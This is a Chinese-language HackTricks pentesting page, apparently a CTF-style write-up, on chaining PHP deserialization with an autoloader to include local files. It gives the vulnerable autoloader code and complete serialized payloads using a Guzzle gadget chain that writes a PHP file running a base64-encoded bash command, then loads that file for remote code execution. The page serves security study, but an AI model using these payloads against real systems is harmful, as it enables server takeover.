# PHP - 反序列化 + 自动加载类

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

首先，你应该查看什么是[**自动加载类**](https://www.php.net/manual/en/language.oop5.autoload.php)。

## PHP 反序列化 + spl\_autoload\_register + LFI/Gadget

我们处于这样一种情况：我们在一个 web 应用程序中发现了一个**PHP 反序列化漏洞**，但是没有**`phpggc`**中的漏洞库。然而，在同一个容器中，有一个**不同的 composer web 应用程序具有漏洞的库**。因此，目标是**加载另一个 web 应用程序的 composer 加载器**，并滥用它来**加载一个将利用反序列化漏洞的库的 gadget**。

步骤：

* 你已经找到了一个**反序列化漏洞**，并且当前应用程序代码中**没有任何 gadget**
* 你可以滥用一个类似下面的**`spl_autoload_register`**函数来**加载任何具有 `.php` 扩展名的本地文件**
* 为此，你使用一个反序列化，其中类的名称将在**`$name`**中。在序列化对象的类名中**不能使用 "/" 或 "."**，但是**代码**会将**下划线**("\_")**替换为斜杠**("/")。因此，类名如`tmp_passwd`将被转换为`/tmp/passwd.php`，并且代码将尝试加载它。\
一个**gadget 示例**将是：**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
如果你有一个**文件上传**功能，并且可以上传一个带有**`.php`扩展名**的文件，你可以直接滥用这个功能并获得RCE。
{% endhint %}

在我的情况下，我没有这样的功能，但是在**同一个容器**中有另一个使用**`phpggc` gadget**的composer网页库。

* 要加载这个其他库，首先你需要**加载那个其他web应用的composer加载器**（因为当前应用的加载器无法访问其他应用的库）。**知道应用的路径**后，你可以很容易地通过以下方式实现：**`O:28:"www_frontend_vendor_autoload":0:{}`**（在我的情况下，composer加载器位于`/www/frontend/vendor/autoload.php`）
* 现在，你可以**加载**其他**应用的composer加载器**，所以现在是**生成phpggc payload**的时候了。在我的情况下，我使用了**`Guzzle/FW1`**，它允许我在文件系统中**写入任意文件**。
* 注意：**生成的gadget无法正常工作**，为了使其正常工作，我**修改了**phpggc的**`chain.php`**负载，并将类的**所有属性**从私有改为公有。如果不这样做，在反序列化字符串后，创建的对象的属性将没有任何值。
* 现在我们有了**加载其他应用的composer加载器**的方法，并且有一个**可用的phpggc payload**，但是我们需要在**同一个请求中执行此操作，以便在使用gadget时加载加载器**。为此，我发送了一个包含两个对象的序列化数组，如下所示：
* 你可以**先看到加载器被加载，然后是payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
* 现在，我们可以**创建和写入文件**，但是用户**无法写入Web服务器内的任何文件夹**。因此，如您在有效载荷中所见，PHP调用**`system`**并使用一些**base64**创建在**`/tmp/a.php`**中。然后，我们可以**重用我们之前用于LFI的第一种有效载荷**，来加载其他Web应用程序的composer加载器，以加载生成的`/tmp/a.php`文件。只需将其添加到反序列化小工具中：&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**负载摘要**

* **加载同一容器中不同 Web 应用程序的 composer 自动加载**
* **加载 phpggc gadget** 以滥用其他 Web 应用程序的库（最初易受序列化攻击的 Web 应用程序没有任何库中的 gadget）
* 该 gadget 将在 /tmp/a.php 中创建一个带有恶意命令的 PHP 负载文件（Web 应用程序用户无法在任何 Web 应用程序的任何文件夹中写入）
* 负载的最后部分将使用 **加载生成的 php 文件** 来执行命令

我需要**调用这个序列化两次**。在我的测试中，第一次创建了 `/tmp/a.php` 文件，但没有加载，第二次正确加载了它。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得最新版本的 PEASS 或下载 HackTricks 的 PDF 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 NFT 收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或在 **Twitter** 上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
